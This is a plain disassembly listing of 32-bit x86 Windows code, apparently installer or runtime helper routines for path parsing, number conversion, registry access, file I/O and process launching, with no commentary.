  405e75:	e8 97 b5 ff ff       	call   0x401411
  405e7a:	6a 01                	push   $0x1
  405e7c:	e8 1d e1 ff ff       	call   0x403f9e
  405e81:	8b c6                	mov    %esi,%eax
  405e83:	eb 2b                	jmp    0x405eb0
  405e85:	57                   	push   %edi
  405e86:	e8 86 f4 ff ff       	call   0x405311
  405e8b:	85 c0                	test   %eax,%eax
  405e8d:	74 18                	je     0x405ea7
  405e8f:	39 3d 54 95 42 00    	cmp    %edi,0x429554
  405e95:	0f 85 4e ff ff ff    	jne    0x405de9
  405e9b:	6a 02                	push   $0x2
  405e9d:	e8 6f b5 ff ff       	call   0x401411
  405ea2:	e9 42 ff ff ff       	jmp    0x405de9
  405ea7:	6a 01                	push   $0x1
  405ea9:	e8 63 b5 ff ff       	call   0x401411
  405eae:	33 c0                	xor    %eax,%eax
  405eb0:	5f                   	pop    %edi
  405eb1:	5e                   	pop    %esi
  405eb2:	5d                   	pop    %ebp
  405eb3:	5b                   	pop    %ebx
  405eb4:	83 c4 10             	add    $0x10,%esp
  405eb7:	c3                   	ret
  405eb8:	55                   	push   %ebp
  405eb9:	8b ec                	mov    %esp,%ebp
  405ebb:	83 ec 20             	sub    $0x20,%esp
  405ebe:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  405ec2:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405ec6:	b8 b8 98 40 00       	mov    $0x4098b8,%eax
  405ecb:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  405ece:	89 45 e8             	mov    %eax,-0x18(%ebp)
  405ed1:	8d 45 e0             	lea    -0x20(%ebp),%eax
  405ed4:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405ed7:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405eda:	50                   	push   %eax
  405edb:	ff 75 08             	push   0x8(%ebp)
  405ede:	c6 45 e0 01          	movb   $0x1,-0x20(%ebp)
  405ee2:	c6 45 e1 00          	movb   $0x0,-0x1f(%ebp)
  405ee6:	66 c7 45 e2 04 00    	movw   $0x4,-0x1e(%ebp)
  405eec:	c7 45 f0 a8 98 40 00 	movl   $0x4098a8,-0x10(%ebp)
  405ef3:	c7 45 f4 0c 00 00 00 	movl   $0xc,-0xc(%ebp)
  405efa:	ff 15 a0 90 40 00    	call   *0x4090a0
  405f00:	85 c0                	test   %eax,%eax
  405f02:	74 04                	je     0x405f08
  405f04:	33 c0                	xor    %eax,%eax
  405f06:	eb 06                	jmp    0x405f0e
  405f08:	ff 15 ec 90 40 00    	call   *0x4090ec
  405f0e:	c9                   	leave
  405f0f:	c2 04 00             	ret    $0x4
  405f12:	6a 00                	push   $0x0
  405f14:	ff 74 24 08          	push   0x8(%esp)
  405f18:	ff 15 a0 90 40 00    	call   *0x4090a0
  405f1e:	85 c0                	test   %eax,%eax
  405f20:	74 04                	je     0x405f26
  405f22:	33 c0                	xor    %eax,%eax
  405f24:	eb 06                	jmp    0x405f2c
  405f26:	ff 15 ec 90 40 00    	call   *0x4090ec
  405f2c:	c2 04 00             	ret    $0x4
  405f2f:	55                   	push   %ebp
  405f30:	8b ec                	mov    %esp,%ebp
  405f32:	83 ec 10             	sub    $0x10,%esp
  405f35:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405f38:	50                   	push   %eax
  405f39:	68 18 5a 42 00       	push   $0x425a18
  405f3e:	33 c0                	xor    %eax,%eax
  405f40:	50                   	push   %eax
  405f41:	50                   	push   %eax
  405f42:	68 00 00 00 04       	push   $0x4000000
  405f47:	50                   	push   %eax
  405f48:	50                   	push   %eax
  405f49:	50                   	push   %eax
  405f4a:	ff 75 08             	push   0x8(%ebp)
  405f4d:	c7 05 18 5a 42 00 44 	movl   $0x44,0x425a18
  405f54:	00 00 00 
  405f57:	50                   	push   %eax
  405f58:	ff 15 9c 90 40 00    	call   *0x40909c
  405f5e:	85 c0                	test   %eax,%eax
  405f60:	74 0c                	je     0x405f6e
  405f62:	ff 75 f4             	push   -0xc(%ebp)
  405f65:	ff 15 1c 91 40 00    	call   *0x40911c
  405f6b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405f6e:	c9                   	leave
  405f6f:	c2 04 00             	ret    $0x4
  405f72:	8b 44 24 04          	mov    0x4(%esp),%eax
  405f76:	83 60 24 00          	andl   $0x0,0x24(%eax)
  405f7a:	50                   	push   %eax
  405f7b:	c7 00 3c 00 00 00    	movl   $0x3c,(%eax)
  405f81:	ff 15 a4 91 40 00    	call   *0x4091a4
  405f87:	c2 04 00             	ret    $0x4
  405f8a:	ff 25 b0 91 40 00    	jmp    *0x4091b0
  405f90:	68 00 04 00 00       	push   $0x400
  405f95:	ff 74 24 0c          	push   0xc(%esp)
  405f99:	ff 74 24 0c          	push   0xc(%esp)
  405f9d:	ff 35 48 95 42 00    	push   0x429548
  405fa3:	ff 15 ac 91 40 00    	call   *0x4091ac
  405fa9:	c2 08 00             	ret    $0x8
  405fac:	8b 44 24 08          	mov    0x8(%esp),%eax
  405fb0:	8b c8                	mov    %eax,%ecx
  405fb2:	81 e1 ff ff 1f 00    	and    $0x1fffff,%ecx
  405fb8:	83 3d 60 a6 42 00 00 	cmpl   $0x0,0x42a660
  405fbf:	74 05                	je     0x405fc6
  405fc1:	c1 e8 15             	shr    $0x15,%eax
  405fc4:	75 47                	jne    0x40600d
  405fc6:	83 3d 68 a6 42 00 00 	cmpl   $0x0,0x42a668
  405fcd:	74 06                	je     0x405fd5
  405fcf:	81 f1 00 00 18 00    	xor    $0x180000,%ecx
  405fd5:	a1 84 a5 42 00       	mov    0x42a584,%eax
  405fda:	a3 34 b0 40 00       	mov    %eax,0x40b034
  405fdf:	a1 88 a5 42 00       	mov    0x42a588,%eax
  405fe4:	a3 38 b0 40 00       	mov    %eax,0x40b038
  405fe9:	8b 44 24 04          	mov    0x4(%esp),%eax
  405fed:	68 30 b0 40 00       	push   $0x40b030
  405ff2:	a3 3c b0 40 00       	mov    %eax,0x40b03c
  405ff7:	c7 05 40 b0 40 00 80 	movl   $0x429580,0x40b040
  405ffe:	95 42 00 
  406001:	89 0d 44 b0 40 00    	mov    %ecx,0x40b044
  406007:	ff 15 1c 92 40 00    	call   *0x40921c
  40600d:	c2 08 00             	ret    $0x8
  406010:	8b 44 24 04          	mov    0x4(%esp),%eax
  406014:	eb 0e                	jmp    0x406024
  406016:	66 3b 4c 24 08       	cmp    0x8(%esp),%cx
  40601b:	74 0f                	je     0x40602c
  40601d:	50                   	push   %eax
  40601e:	ff 15 28 92 40 00    	call   *0x409228
  406024:	0f b7 08             	movzwl (%eax),%ecx
  406027:	66 85 c9             	test   %cx,%cx
  40602a:	75 ea                	jne    0x406016
  40602c:	c2 08 00             	ret    $0x8
  40602f:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  406033:	0f b7 01             	movzwl (%ecx),%eax
  406036:	8b d0                	mov    %eax,%edx
  406038:	83 ca 20             	or     $0x20,%edx
  40603b:	66 3d 5c 00          	cmp    $0x5c,%ax
  40603f:	0f b7 d2             	movzwl %dx,%edx
  406042:	75 06                	jne    0x40604a
  406044:	66 39 41 02          	cmp    %ax,0x2(%ecx)
  406048:	74 10                	je     0x40605a
  40604a:	83 c2 9f             	add    $0xffffff9f,%edx
  40604d:	66 83 fa 19          	cmp    $0x19,%dx
  406051:	77 0c                	ja     0x40605f
  406053:	66 83 79 02 3a       	cmpw   $0x3a,0x2(%ecx)
  406058:	75 05                	jne    0x40605f
  40605a:	33 c0                	xor    %eax,%eax
  40605c:	40                   	inc    %eax
  40605d:	eb 02                	jmp    0x406061
  40605f:	33 c0                	xor    %eax,%eax
  406061:	c2 04 00             	ret    $0x4
  406064:	53                   	push   %ebx
  406065:	56                   	push   %esi
  406066:	8b 35 28 92 40 00    	mov    0x409228,%esi
  40606c:	57                   	push   %edi
  40606d:	8b 7c 24 10          	mov    0x10(%esp),%edi
  406071:	57                   	push   %edi
  406072:	ff d6                	call   *%esi
  406074:	8b d8                	mov    %eax,%ebx
  406076:	53                   	push   %ebx
  406077:	ff d6                	call   *%esi
  406079:	0f b7 0f             	movzwl (%edi),%ecx
  40607c:	66 85 c9             	test   %cx,%cx
  40607f:	74 12                	je     0x406093
  406081:	66 83 3b 3a          	cmpw   $0x3a,(%ebx)
  406085:	75 0c                	jne    0x406093
  406087:	66 83 7b 02 5c       	cmpw   $0x5c,0x2(%ebx)
  40608c:	75 05                	jne    0x406093
  40608e:	50                   	push   %eax
  40608f:	ff d6                	call   *%esi
  406091:	eb 28                	jmp    0x4060bb
  406093:	66 83 f9 5c          	cmp    $0x5c,%cx
  406097:	75 20                	jne    0x4060b9
  406099:	66 39 4f 02          	cmp    %cx,0x2(%edi)
  40609d:	75 1a                	jne    0x4060b9
  40609f:	6a 02                	push   $0x2
  4060a1:	5e                   	pop    %esi
  4060a2:	6a 5c                	push   $0x5c
  4060a4:	50                   	push   %eax
  4060a5:	4e                   	dec    %esi
  4060a6:	e8 65 ff ff ff       	call   0x406010
  4060ab:	66 83 38 00          	cmpw   $0x0,(%eax)
  4060af:	74 08                	je     0x4060b9
  4060b1:	40                   	inc    %eax
  4060b2:	40                   	inc    %eax
  4060b3:	85 f6                	test   %esi,%esi
  4060b5:	75 eb                	jne    0x4060a2
  4060b7:	eb 02                	jmp    0x4060bb
  4060b9:	33 c0                	xor    %eax,%eax
  4060bb:	5f                   	pop    %edi
  4060bc:	5e                   	pop    %esi
  4060bd:	5b                   	pop    %ebx
  4060be:	c2 04 00             	ret    $0x4
  4060c1:	55                   	push   %ebp
  4060c2:	8b ec                	mov    %esp,%ebp
  4060c4:	51                   	push   %ecx
  4060c5:	53                   	push   %ebx
  4060c6:	56                   	push   %esi
  4060c7:	57                   	push   %edi
  4060c8:	ff 75 0c             	push   0xc(%ebp)
  4060cb:	8b 3d 48 91 40 00    	mov    0x409148,%edi
  4060d1:	ff d7                	call   *%edi
  4060d3:	8b 75 08             	mov    0x8(%ebp),%esi
  4060d6:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4060d9:	eb 27                	jmp    0x406102
  4060db:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4060de:	ff 75 0c             	push   0xc(%ebp)
  4060e1:	8a 1c 30             	mov    (%eax,%esi,1),%bl
  4060e4:	56                   	push   %esi
  4060e5:	c6 04 30 00          	movb   $0x0,(%eax,%esi,1)
  4060e9:	ff 15 98 90 40 00    	call   *0x409098
  4060ef:	85 c0                	test   %eax,%eax
  4060f1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4060f4:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  4060f7:	74 1a                	je     0x406113
  4060f9:	56                   	push   %esi
  4060fa:	ff 15 a8 92 40 00    	call   *0x4092a8
  406100:	8b f0                	mov    %eax,%esi
  406102:	56                   	push   %esi
  406103:	ff d7                	call   *%edi
  406105:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  406108:	7d d1                	jge    0x4060db
  40610a:	33 c0                	xor    %eax,%eax
  40610c:	5f                   	pop    %edi
  40610d:	5e                   	pop    %esi
  40610e:	5b                   	pop    %ebx
  40610f:	c9                   	leave
  406110:	c2 08 00             	ret    $0x8
  406113:	8b c6                	mov    %esi,%eax
  406115:	eb f5                	jmp    0x40610c
  406117:	55                   	push   %ebp
  406118:	8b ec                	mov    %esp,%ebp
  40611a:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  40611e:	8b 45 08             	mov    0x8(%ebp),%eax
  406121:	76 14                	jbe    0x406137
  406123:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406126:	2b c8                	sub    %eax,%ecx
  406128:	8a 14 01             	mov    (%ecx,%eax,1),%dl
  40612b:	ff 4d 10             	decl   0x10(%ebp)
  40612e:	88 10                	mov    %dl,(%eax)
  406130:	40                   	inc    %eax
  406131:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  406135:	77 f1                	ja     0x406128
  406137:	5d                   	pop    %ebp
  406138:	c2 0c 00             	ret    $0xc
  40613b:	56                   	push   %esi
  40613c:	ff 74 24 08          	push   0x8(%esp)
  406140:	ff 15 fc 90 40 00    	call   *0x4090fc
  406146:	8b f0                	mov    %eax,%esi
  406148:	83 fe ff             	cmp    $0xffffffff,%esi
  40614b:	74 0e                	je     0x40615b
  40614d:	83 e0 fe             	and    $0xfffffffe,%eax
  406150:	50                   	push   %eax
  406151:	ff 74 24 0c          	push   0xc(%esp)
  406155:	ff 15 f8 90 40 00    	call   *0x4090f8
  40615b:	8b c6                	mov    %esi,%eax
  40615d:	5e                   	pop    %esi
  40615e:	c2 04 00             	ret    $0x4
  406161:	ff 74 24 04          	push   0x4(%esp)
  406165:	ff 15 fc 90 40 00    	call   *0x4090fc
  40616b:	8b c8                	mov    %eax,%ecx
  40616d:	41                   	inc    %ecx
  40616e:	6a 00                	push   $0x0
  406170:	f7 d9                	neg    %ecx
  406172:	1b c9                	sbb    %ecx,%ecx
  406174:	23 c8                	and    %eax,%ecx
  406176:	51                   	push   %ecx
  406177:	ff 74 24 14          	push   0x14(%esp)
  40617b:	6a 00                	push   $0x0
  40617d:	6a 01                	push   $0x1
  40617f:	ff 74 24 1c          	push   0x1c(%esp)
  406183:	ff 74 24 1c          	push   0x1c(%esp)
  406187:	ff 15 94 90 40 00    	call   *0x409094
  40618d:	c2 0c 00             	ret    $0xc
  406190:	55                   	push   %ebp
  406191:	8b ec                	mov    %esp,%ebp
  406193:	51                   	push   %ecx
  406194:	51                   	push   %ecx
  406195:	56                   	push   %esi
  406196:	8b 75 08             	mov    0x8(%ebp),%esi
  406199:	57                   	push   %edi
  40619a:	6a 64                	push   $0x64
  40619c:	5f                   	pop    %edi
  40619d:	a1 94 99 40 00       	mov    0x409994,%eax
  4061a2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4061a5:	a1 98 99 40 00       	mov    0x409998,%eax
  4061aa:	4f                   	dec    %edi
  4061ab:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4061ae:	ff 15 f0 90 40 00    	call   *0x4090f0
  4061b4:	6a 1a                	push   $0x1a
  4061b6:	59                   	pop    %ecx
  4061b7:	33 d2                	xor    %edx,%edx
  4061b9:	f7 f1                	div    %ecx
  4061bb:	56                   	push   %esi
  4061bc:	6a 00                	push   $0x0
  4061be:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4061c1:	50                   	push   %eax
  4061c2:	ff 75 0c             	push   0xc(%ebp)
  4061c5:	66 01 55 fc          	add    %dx,-0x4(%ebp)
  4061c9:	ff 15 90 90 40 00    	call   *0x409090
  4061cf:	85 c0                	test   %eax,%eax
  4061d1:	75 0d                	jne    0x4061e0
  4061d3:	85 ff                	test   %edi,%edi
  4061d5:	75 c6                	jne    0x40619d
  4061d7:	66 21 3e             	and    %di,(%esi)
  4061da:	5f                   	pop    %edi
  4061db:	5e                   	pop    %esi
  4061dc:	c9                   	leave
  4061dd:	c2 08 00             	ret    $0x8
  4061e0:	8b c6                	mov    %esi,%eax
  4061e2:	eb f6                	jmp    0x4061da
  4061e4:	55                   	push   %ebp
  4061e5:	8b ec                	mov    %esp,%ebp
  4061e7:	56                   	push   %esi
  4061e8:	8b 75 10             	mov    0x10(%ebp),%esi
  4061eb:	6a 00                	push   $0x0
  4061ed:	8d 45 10             	lea    0x10(%ebp),%eax
  4061f0:	50                   	push   %eax
  4061f1:	56                   	push   %esi
  4061f2:	ff 75 0c             	push   0xc(%ebp)
  4061f5:	ff 75 08             	push   0x8(%ebp)
  4061f8:	ff 15 50 91 40 00    	call   *0x409150
  4061fe:	85 c0                	test   %eax,%eax
  406200:	74 0a                	je     0x40620c
  406202:	3b 75 10             	cmp    0x10(%ebp),%esi
  406205:	75 05                	jne    0x40620c
  406207:	33 c0                	xor    %eax,%eax
  406209:	40                   	inc    %eax
  40620a:	eb 02                	jmp    0x40620e
  40620c:	33 c0                	xor    %eax,%eax
  40620e:	5e                   	pop    %esi
  40620f:	5d                   	pop    %ebp
  406210:	c2 0c 00             	ret    $0xc
  406213:	55                   	push   %ebp
  406214:	8b ec                	mov    %esp,%ebp
  406216:	56                   	push   %esi
  406217:	8b 75 10             	mov    0x10(%ebp),%esi
  40621a:	6a 00                	push   $0x0
  40621c:	8d 45 10             	lea    0x10(%ebp),%eax
  40621f:	50                   	push   %eax
  406220:	56                   	push   %esi
  406221:	ff 75 0c             	push   0xc(%ebp)
  406224:	ff 75 08             	push   0x8(%ebp)
  406227:	ff 15 8c 90 40 00    	call   *0x40908c
  40622d:	85 c0                	test   %eax,%eax
  40622f:	74 0a                	je     0x40623b
  406231:	3b 75 10             	cmp    0x10(%ebp),%esi
  406234:	75 05                	jne    0x40623b
  406236:	33 c0                	xor    %eax,%eax
  406238:	40                   	inc    %eax
  406239:	eb 02                	jmp    0x40623d
  40623b:	33 c0                	xor    %eax,%eax
  40623d:	5e                   	pop    %esi
  40623e:	5d                   	pop    %ebp
  40623f:	c2 0c 00             	ret    $0xc
  406242:	55                   	push   %ebp
  406243:	8b ec                	mov    %esp,%ebp
  406245:	53                   	push   %ebx
  406246:	8b 5d 08             	mov    0x8(%ebp),%ebx
  406249:	56                   	push   %esi
  40624a:	8b 35 54 91 40 00    	mov    0x409154,%esi
  406250:	57                   	push   %edi
  406251:	6a 01                	push   $0x1
  406253:	33 ff                	xor    %edi,%edi
  406255:	57                   	push   %edi
  406256:	57                   	push   %edi
  406257:	53                   	push   %ebx
  406258:	ff d6                	call   *%esi
  40625a:	85 c0                	test   %eax,%eax
  40625c:	75 4f                	jne    0x4062ad
  40625e:	6a 02                	push   $0x2
  406260:	8d 45 08             	lea    0x8(%ebp),%eax
  406263:	50                   	push   %eax
  406264:	53                   	push   %ebx
  406265:	e8 7a ff ff ff       	call   0x4061e4
  40626a:	85 c0                	test   %eax,%eax
  40626c:	74 0c                	je     0x40627a
  40626e:	66 81 7d 08 ff fe    	cmpw   $0xfeff,0x8(%ebp)
  406274:	75 04                	jne    0x40627a
  406276:	33 c0                	xor    %eax,%eax
  406278:	eb 36                	jmp    0x4062b0
  40627a:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  40627d:	74 28                	je     0x4062a7
  40627f:	6a 01                	push   $0x1
  406281:	57                   	push   %edi
  406282:	57                   	push   %edi
  406283:	53                   	push   %ebx
  406284:	ff d6                	call   *%esi
  406286:	85 c0                	test   %eax,%eax
  406288:	75 1d                	jne    0x4062a7
  40628a:	6a 02                	push   $0x2
  40628c:	68 dc 98 40 00       	push   $0x4098dc
  406291:	53                   	push   %ebx
  406292:	e8 7c ff ff ff       	call   0x406213
  406297:	f7 d8                	neg    %eax
  406299:	1b c0                	sbb    %eax,%eax
  40629b:	25 fb bf ff 7f       	and    $0x7fffbffb,%eax
  4062a0:	05 05 40 00 80       	add    $0x80004005,%eax
  4062a5:	eb 09                	jmp    0x4062b0
  4062a7:	57                   	push   %edi
  4062a8:	57                   	push   %edi
  4062a9:	57                   	push   %edi
  4062aa:	53                   	push   %ebx
  4062ab:	ff d6                	call   *%esi
  4062ad:	33 c0                	xor    %eax,%eax
  4062af:	40                   	inc    %eax
  4062b0:	5f                   	pop    %edi
  4062b1:	5e                   	pop    %esi
  4062b2:	5b                   	pop    %ebx
  4062b3:	5d                   	pop    %ebp
  4062b4:	c2 08 00             	ret    $0x8
  4062b7:	53                   	push   %ebx
  4062b8:	33 db                	xor    %ebx,%ebx
  4062ba:	38 1d 7c a6 42 00    	cmp    %bl,0x42a67c
  4062c0:	56                   	push   %esi
  4062c1:	57                   	push   %edi
  4062c2:	7c 05                	jl     0x4062c9
  4062c4:	bb 00 01 00 00       	mov    $0x100,%ebx
  4062c9:	8b 74 24 14          	mov    0x14(%esp),%esi
  4062cd:	8b 06                	mov    (%esi),%eax
  4062cf:	a8 20                	test   $0x20,%al
  4062d1:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4062d5:	74 36                	je     0x40630d
  4062d7:	f7 c7 00 00 00 60    	test   $0x60000000,%edi
  4062dd:	74 2e                	je     0x40630d
  4062df:	8b cf                	mov    %edi,%ecx
  4062e1:	c1 e9 15             	shr    $0x15,%ecx
  4062e4:	ba 00 03 00 00       	mov    $0x300,%edx
  4062e9:	23 ca                	and    %edx,%ecx
  4062eb:	3b ca                	cmp    %edx,%ecx
  4062ed:	75 0a                	jne    0x4062f9
  4062ef:	8b cb                	mov    %ebx,%ecx
  4062f1:	f7 d1                	not    %ecx
  4062f3:	23 0d 70 a6 42 00    	and    0x42a670,%ecx
  4062f9:	25 ff fe ff ff       	and    $0xfffffeff,%eax
  4062fe:	0b c1                	or     %ecx,%eax
  406300:	25 ff fd ff ff       	and    $0xfffffdff,%eax
  406305:	81 e7 ff ff ff 9f    	and    $0x9fffffff,%edi
  40630b:	eb 0d                	jmp    0x40631a
  40630d:	a9 00 00 10 00       	test   $0x100000,%eax
  406312:	74 06                	je     0x40631a
  406314:	0b 05 70 a6 42 00    	or     0x42a670,%eax
  40631a:	8b c8                	mov    %eax,%ecx
  40631c:	23 c3                	and    %ebx,%eax
  40631e:	81 e1 df ff ef ff    	and    $0xffefffdf,%ecx
  406324:	f7 d8                	neg    %eax
  406326:	1b c0                	sbb    %eax,%eax
  406328:	f7 d0                	not    %eax
  40632a:	23 c7                	and    %edi,%eax
  40632c:	5f                   	pop    %edi
  40632d:	89 0e                	mov    %ecx,(%esi)
  40632f:	5e                   	pop    %esi
  406330:	5b                   	pop    %ebx
  406331:	c2 08 00             	ret    $0x8
  406334:	55                   	push   %ebp
  406335:	8b ec                	mov    %esp,%ebp
  406337:	8d 45 10             	lea    0x10(%ebp),%eax
  40633a:	50                   	push   %eax
  40633b:	ff 75 08             	push   0x8(%ebp)
  40633e:	e8 74 ff ff ff       	call   0x4062b7
  406343:	85 c0                	test   %eax,%eax
  406345:	75 05                	jne    0x40634c
  406347:	6a 06                	push   $0x6
  406349:	58                   	pop    %eax
  40634a:	eb 12                	jmp    0x40635e
  40634c:	ff 75 14             	push   0x14(%ebp)
  40634f:	ff 75 10             	push   0x10(%ebp)
  406352:	6a 00                	push   $0x0
  406354:	ff 75 0c             	push   0xc(%ebp)
  406357:	50                   	push   %eax
  406358:	ff 15 28 90 40 00    	call   *0x409028
  40635e:	5d                   	pop    %ebp
  40635f:	c2 10 00             	ret    $0x10
  406362:	55                   	push   %ebp
  406363:	8b ec                	mov    %esp,%ebp
  406365:	8d 45 10             	lea    0x10(%ebp),%eax
  406368:	50                   	push   %eax
  406369:	ff 75 08             	push   0x8(%ebp)
  40636c:	e8 46 ff ff ff       	call   0x4062b7
  406371:	33 c9                	xor    %ecx,%ecx
  406373:	3b c1                	cmp    %ecx,%eax
  406375:	75 05                	jne    0x40637c
  406377:	6a 06                	push   $0x6
  406379:	58                   	pop    %eax
  40637a:	eb 15                	jmp    0x406391
  40637c:	51                   	push   %ecx
  40637d:	ff 75 14             	push   0x14(%ebp)
  406380:	51                   	push   %ecx
  406381:	ff 75 10             	push   0x10(%ebp)
  406384:	51                   	push   %ecx
  406385:	51                   	push   %ecx
  406386:	51                   	push   %ecx
  406387:	ff 75 0c             	push   0xc(%ebp)
  40638a:	50                   	push   %eax
  40638b:	ff 15 2c 90 40 00    	call   *0x40902c
  406391:	5d                   	pop    %ebp
  406392:	c2 10 00             	ret    $0x10
  406395:	55                   	push   %ebp
  406396:	8b ec                	mov    %esp,%ebp
  406398:	51                   	push   %ecx
  406399:	56                   	push   %esi
  40639a:	8d 45 18             	lea    0x18(%ebp),%eax
  40639d:	50                   	push   %eax
  40639e:	8b 45 18             	mov    0x18(%ebp),%eax
  4063a1:	f7 d8                	neg    %eax
  4063a3:	1b c0                	sbb    %eax,%eax
  4063a5:	25 00 01 00 00       	and    $0x100,%eax
  4063aa:	0d 19 00 02 00       	or     $0x20019,%eax
  4063af:	50                   	push   %eax
  4063b0:	ff 75 0c             	push   0xc(%ebp)
  4063b3:	c7 45 fc 00 08 00 00 	movl   $0x800,-0x4(%ebp)
  4063ba:	ff 75 08             	push   0x8(%ebp)
  4063bd:	e8 72 ff ff ff       	call   0x406334
  4063c2:	85 c0                	test   %eax,%eax
  4063c4:	8b 75 14             	mov    0x14(%ebp),%esi
  4063c7:	75 3c                	jne    0x406405
  4063c9:	57                   	push   %edi
  4063ca:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4063cd:	50                   	push   %eax
  4063ce:	56                   	push   %esi
  4063cf:	8d 45 0c             	lea    0xc(%ebp),%eax
  4063d2:	50                   	push   %eax
  4063d3:	6a 00                	push   $0x0
  4063d5:	ff 75 10             	push   0x10(%ebp)
  4063d8:	ff 75 18             	push   0x18(%ebp)
  4063db:	ff 15 10 90 40 00    	call   *0x409010
  4063e1:	ff 75 18             	push   0x18(%ebp)
  4063e4:	8b f8                	mov    %eax,%edi
  4063e6:	ff 15 04 90 40 00    	call   *0x409004
  4063ec:	66 83 a6 fe 07 00 00 	andw   $0x0,0x7fe(%esi)
  4063f3:	00 
  4063f4:	85 ff                	test   %edi,%edi
  4063f6:	5f                   	pop    %edi
  4063f7:	75 0c                	jne    0x406405
  4063f9:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  4063fd:	74 0a                	je     0x406409
  4063ff:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  406403:	74 04                	je     0x406409
  406405:	66 83 26 00          	andw   $0x0,(%esi)
  406409:	5e                   	pop    %esi
  40640a:	c9                   	leave
  40640b:	c2 14 00             	ret    $0x14
  40640e:	ff 74 24 08          	push   0x8(%esp)
  406412:	68 e0 98 40 00       	push   $0x4098e0
  406417:	ff 74 24 0c          	push   0xc(%esp)
  40641b:	ff 15 4c 92 40 00    	call   *0x40924c
  406421:	83 c4 0c             	add    $0xc,%esp
  406424:	c2 08 00             	ret    $0x8
  406427:	55                   	push   %ebp
  406428:	8b ec                	mov    %esp,%ebp
  40642a:	51                   	push   %ecx
  40642b:	51                   	push   %ecx
  40642c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40642f:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406433:	66 83 39 2d          	cmpw   $0x2d,(%ecx)
  406437:	53                   	push   %ebx
  406438:	56                   	push   %esi
  406439:	6a 0a                	push   $0xa
  40643b:	58                   	pop    %eax
  40643c:	6a 39                	push   $0x39
  40643e:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  406445:	5b                   	pop    %ebx
  406446:	75 06                	jne    0x40644e
  406448:	41                   	inc    %ecx
  406449:	41                   	inc    %ecx
  40644a:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
  40644e:	66 83 39 30          	cmpw   $0x30,(%ecx)
  406452:	75 27                	jne    0x40647b
  406454:	41                   	inc    %ecx
  406455:	41                   	inc    %ecx
  406456:	0f b7 11             	movzwl (%ecx),%edx
  406459:	66 83 fa 30          	cmp    $0x30,%dx
  40645d:	72 0c                	jb     0x40646b
  40645f:	66 83 fa 37          	cmp    $0x37,%dx
  406463:	77 06                	ja     0x40646b
  406465:	6a 08                	push   $0x8
  406467:	58                   	pop    %eax
  406468:	6a 37                	push   $0x37
  40646a:	5b                   	pop    %ebx
  40646b:	0f b7 d2             	movzwl %dx,%edx
  40646e:	83 e2 df             	and    $0xffffffdf,%edx
  406471:	83 fa 58             	cmp    $0x58,%edx
  406474:	75 05                	jne    0x40647b
  406476:	6a 10                	push   $0x10
  406478:	41                   	inc    %ecx
  406479:	58                   	pop    %eax
  40647a:	41                   	inc    %ecx
  40647b:	0f b7 11             	movzwl (%ecx),%edx
  40647e:	41                   	inc    %ecx
  40647f:	41                   	inc    %ecx
  406480:	83 fa 30             	cmp    $0x30,%edx
  406483:	7c 0c                	jl     0x406491
  406485:	0f b7 f3             	movzwl %bx,%esi
  406488:	3b d6                	cmp    %esi,%edx
  40648a:	7f 05                	jg     0x406491
  40648c:	83 ea 30             	sub    $0x30,%edx
  40648f:	eb 1b                	jmp    0x4064ac
  406491:	66 3d 10 00          	cmp    $0x10,%ax
  406495:	75 23                	jne    0x4064ba
  406497:	8b f2                	mov    %edx,%esi
  406499:	83 e6 df             	and    $0xffffffdf,%esi
  40649c:	83 fe 41             	cmp    $0x41,%esi
  40649f:	7c 19                	jl     0x4064ba
  4064a1:	83 fe 46             	cmp    $0x46,%esi
  4064a4:	7f 14                	jg     0x4064ba
  4064a6:	83 e2 07             	and    $0x7,%edx
  4064a9:	83 c2 09             	add    $0x9,%edx
  4064ac:	0f b7 f0             	movzwl %ax,%esi
  4064af:	0f af 75 fc          	imul   -0x4(%ebp),%esi
  4064b3:	03 f2                	add    %edx,%esi
  4064b5:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4064b8:	eb c1                	jmp    0x40647b
  4064ba:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4064bd:	0f af 45 fc          	imul   -0x4(%ebp),%eax
  4064c1:	5e                   	pop    %esi
  4064c2:	5b                   	pop    %ebx
  4064c3:	c9                   	leave
  4064c4:	c2 04 00             	ret    $0x4
  4064c7:	68 00 04 00 00       	push   $0x400
  4064cc:	ff 74 24 0c          	push   0xc(%esp)
  4064d0:	ff 74 24 0c          	push   0xc(%esp)
  4064d4:	ff 15 b8 90 40 00    	call   *0x4090b8
  4064da:	c2 08 00             	ret    $0x8
  4064dd:	ff 25 bc 90 40 00    	jmp    *0x4090bc
  4064e3:	ff 25 88 90 40 00    	jmp    *0x409088
  4064e9:	33 c0                	xor    %eax,%eax
  4064eb:	50                   	push   %eax
  4064ec:	50                   	push   %eax
  4064ed:	ff 74 24 14          	push   0x14(%esp)
  4064f1:	ff 74 24 14          	push   0x14(%esp)
  4064f5:	6a ff                	push   $0xffffffff
  4064f7:	ff 74 24 18          	push   0x18(%esp)
  4064fb:	50                   	push   %eax
  4064fc:	50                   	push   %eax
